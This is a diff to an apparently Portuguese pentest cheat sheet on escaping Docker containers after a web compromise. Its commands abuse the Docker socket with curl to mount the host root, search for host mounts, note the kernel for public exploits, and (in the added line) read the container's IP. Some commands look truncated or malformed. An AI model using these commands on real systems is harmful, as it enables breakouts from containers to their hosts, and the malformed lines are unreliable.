@@ -7398,6 +7398,7 @@ Formas de conseguir sair do docker ao comprometer uma maquina através da WEB
 	curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["chroot", "/host"], "Volumes": {"/": {}}, "Binds": ["/:/host"]}' http://localhost/cont/creat
 	mount | grep -v type | cat /proc/mounts && echo "PROCURA POR PONTOS DO HOST MONTADO NO CONTAINER"
 	uname -a && echo "POR SER O MESMO KERNEL DESCOBRIR FORMAS DE ESCALAR USANDO ALGUM EXPL PUBLIC"
+	cat /proc/net/fib_trie | hostname -i && echo "VERIFICA O IP DO DOCKER"
 
 ### Ferramentas Avulsas | Ferramentas aleatorias
 Tags: `#ferramentas` `#misc`
